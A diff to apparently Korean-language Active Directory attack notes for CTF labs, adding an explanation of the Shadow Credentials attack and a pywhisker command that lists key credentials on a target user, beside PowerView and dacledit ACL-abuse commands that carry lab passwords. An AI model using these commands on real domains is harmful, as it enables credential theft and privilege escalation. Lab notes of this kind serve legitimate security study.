@@ -216,7 +216,10 @@ Add-DomainObjectAcl -TargetIdentity GPOAdmin -PrincipalIdentity pedro -Rights Al
 ```
 
 ## Shadow Credentials
-- msDS-KeyCredentialLink
+- CA가 존재하는 상태여야만 PKINIT 인증을 지원함.
+- 유저의 객체에 `msDS-KeyCredentialLink`를 확인하여 인증을 진행
+- pywhisker가 공개키/개인키 쌍을 생성 후 공개키는 `msDS-KeyCredentialLink`에 추가하고 개인키는 로컬에 저장.
+- 개인키를 가지고 PKINIT 인증을 시도하여 TGT를 발급받고 해시를 추출하는 공격.
 - GenericAll
 - GenericWrite
 - WriteProperty
@@ -233,6 +236,9 @@ $userSID = (Get-DomainUser -Identity jeffry).objectsid
 Get-DomainObjectAcl -Identity gabriel | ?{$_.SecurityIdentifier -eq $userSID}
 ```
 ```bash
+# 기존에 등록되어 있는 공개키 확인
+python3 pywhisker.py -d administrator.htb -u olivia -p ichliebedich --target michael --action list
+
 python3 examples/dacledit.py -target gabriel -principal jeffry -dc-ip 10.129.228.236 lab.local/jeffry:Music001
 ```
 
